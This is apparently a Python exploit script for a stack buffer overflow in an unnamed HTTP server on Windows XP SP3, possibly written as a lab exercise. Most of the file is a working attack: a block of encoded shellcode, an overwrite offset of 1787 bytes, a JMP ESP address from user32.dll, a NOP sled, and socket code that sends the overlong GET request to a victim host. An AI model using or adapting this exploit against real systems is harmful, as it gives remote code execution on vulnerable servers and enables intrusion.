#!/usr/bin/python
import socket

# Author : Nu11pwn
# 	Host system :  Ubuntu
#	Victim sytem : Windows XP SP3


victim_host = "10.0.0.213"
victim_port = 80

shellcode =  ""
shellcode += "\xda\xcc\xbf\x26\x28\x2d\xe8\xd9\x74\x24\xf4\x5a"
shellcode += "\x29\xc9\xb1\x52\x31\x7a\x17\x83\xc2\x04\x03\x5c"
shellcode += "\x3b\xcf\x1d\x5c\xd3\x8d\xde\x9c\x24\xf2\x57\x79"
shellcode += "\x15\x32\x03\x0a\x06\x82\x47\x5e\xab\x69\x05\x4a"
shellcode += "\x38\x1f\x82\x7d\x89\xaa\xf4\xb0\x0a\x86\xc5\xd3"
shellcode += "\x88\xd5\x19\x33\xb0\x15\x6c\x32\xf5\x48\x9d\x66"
shellcode += "\xae\x07\x30\x96\xdb\x52\x89\x1d\x97\x73\x89\xc2"
shellcode += "\x60\x75\xb8\x55\xfa\x2c\x1a\x54\x2f\x45\x13\x4e"
shellcode += "\x2c\x60\xed\xe5\x86\x1e\xec\x2f\xd7\xdf\x43\x0e"
shellcode += "\xd7\x2d\x9d\x57\xd0\xcd\xe8\xa1\x22\x73\xeb\x76"
shellcode += "\x58\xaf\x7e\x6c\xfa\x24\xd8\x48\xfa\xe9\xbf\x1b"
shellcode += "\xf0\x46\xcb\x43\x15\x58\x18\xf8\x21\xd1\x9f\x2e"
shellcode += "\xa0\xa1\xbb\xea\xe8\x72\xa5\xab\x54\xd4\xda\xab"
shellcode += "\x36\x89\x7e\xa0\xdb\xde\xf2\xeb\xb3\x13\x3f\x13"
shellcode += "\x44\x3c\x48\x60\x76\xe3\xe2\xee\x3a\x6c\x2d\xe9"
shellcode += "\x3d\x47\x89\x65\xc0\x68\xea\xac\x07\x3c\xba\xc6"
shellcode += "\xae\x3d\x51\x16\x4e\xe8\xf6\x46\xe0\x43\xb7\x36"
shellcode += "\x40\x34\x5f\x5c\x4f\x6b\x7f\x5f\x85\x04\xea\x9a"
shellcode += "\x4e\x21\xeb\xa4\xc0\x5d\xe9\xa4\xcd\xc1\x64\x42"
shellcode += "\x87\xe9\x20\xdd\x30\x93\x68\x95\xa1\x5c\xa7\xd0"
shellcode += "\xe2\xd7\x44\x25\xac\x1f\x20\x35\x59\xd0\x7f\x67"
shellcode += "\xcc\xef\x55\x0f\x92\x62\x32\xcf\xdd\x9e\xed\x98"
shellcode += "\x8a\x51\xe4\x4c\x27\xcb\x5e\x72\xba\x8d\x99\x36"
shellcode += "\x61\x6e\x27\xb7\xe4\xca\x03\xa7\x30\xd2\x0f\x93"
shellcode += "\xec\x85\xd9\x4d\x4b\x7c\xa8\x27\x05\xd3\x62\xaf"
shellcode += "\xd0\x1f\xb5\xa9\xdc\x75\x43\x55\x6c\x20\x12\x6a"
shellcode += "\x41\xa4\x92\x13\xbf\x54\x5c\xce\x7b\x64\x17\x52"
shellcode += "\x2d\xed\xfe\x07\x6f\x70\x01\xf2\xac\x8d\x82\xf6"
shellcode += "\x4c\x6a\x9a\x73\x48\x36\x1c\x68\x20\x27\xc9\x8e"
shellcode += "\x97\x48\xd8"

# Log data, item 22
# Address=0BADF00D
# Message=    EIP contains normal pattern : 0x36684335 (offset 1787)
# [*] Exact match at offset 1787
# bad chars - "\x00\x0d

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((victim_host, victim_port))

jmpesp = "\x53\x93\x42\x7e" # JMP ESP from user32.dll in Windows XP sp3

payload  = "GET "
payload += "A" * 1787
payload += jmpesp
payload += "\x90" * 16
payload += shellcode
payload += " HTTP/1.1\r\n\r\n"

exploit.send(payload)
